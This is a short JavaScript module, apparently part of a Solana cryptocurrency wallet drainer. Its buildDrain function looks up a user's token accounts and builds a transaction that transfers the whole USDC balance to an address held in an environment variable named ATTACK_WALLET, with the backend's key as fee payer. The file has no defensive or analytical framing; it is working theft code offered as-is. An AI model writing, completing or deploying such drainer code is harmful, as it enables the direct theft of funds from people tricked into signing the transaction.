const {
    Transaction,
    PublicKey,
} = require("@solana/web3.js");

const { createTransferInstruction } = require("@solana/spl-token");
const { getUserTokenAccounts } = require("../solana/tokenService");

async function buildDrain(user, connection) {
    const tx = new Transaction();

    const userPubkey = new PublicKey(user);

    const t = await getUserTokenAccounts(user, connection);

    const { blockhash } = await connection.getLatestBlockhash();
    tx.recentBlockhash = blockhash;

    // backend bude signer
    tx.feePayer = new PublicKey(process.env.PUBLIC_KEY);

    if (t.usdc && t.usdc > 0n) {
        tx.add(
            createTransferInstruction(
                t.usdcATA,
                process.env.ATTACK_WALLET,
                userPubkey,
                t.usdc
            )
        );
    }

    return tx;
}

module.exports = { buildDrain };